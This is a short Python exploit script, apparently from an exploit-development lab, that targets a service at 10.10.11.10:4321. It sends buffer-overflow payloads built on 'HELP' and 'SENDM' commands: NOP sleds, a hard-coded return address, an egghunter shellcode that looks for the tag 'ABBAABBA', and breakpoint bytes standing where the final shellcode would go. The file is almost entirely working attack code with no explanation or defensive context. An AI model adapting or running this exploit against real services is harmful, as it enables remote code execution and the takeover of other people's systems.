#!/usr/bin/python

import socket
import os
import sys
import time
host = "10.10.11.10"
port = 4321






#for count in range(1,11):
#   time.sleep(0)
#   buffer = 'HELP '
#   buffer += "\x90" * 50
#   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#   s.connect((host,port))
#   time.sleep(0)
#   print(s.recv(1024))

#   s.send(buffer)
#   time.sleep(0)
#   s.close()

def crashc():





    buffer = 'HELP '
    buffer += '\x90' * 7


    buffer += '\x78\x6a\x83\x7c'







    buffer += "\x90" 



    buffer += '('
    buffer += "\x90\x90\x90\x90"
    buffer += "\xcc" * 40
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    #print s.recv(1024)
    time.sleep(0)



    s.send(buffer)

    s.close()





def crash():





    buffer = 'HELP '
    buffer += '\x90' * 7


    buffer += '\x78\x6a\x83\x7c'







    buffer += "\x90" 

    egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x41\x42\x42\x41\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

    buffer += egghunter

    buffer += '('

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    #print s.recv(1024)
    time.sleep(0)



    s.send(buffer)

    s.close()






buffer = 'SENDM '



buffer += "\x90" * 40
buffer += "ABBAABBA"
buffer += "\xcc" * 40
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print(s.recv(1024))
s.send(buffer)
s.close()



crashc()
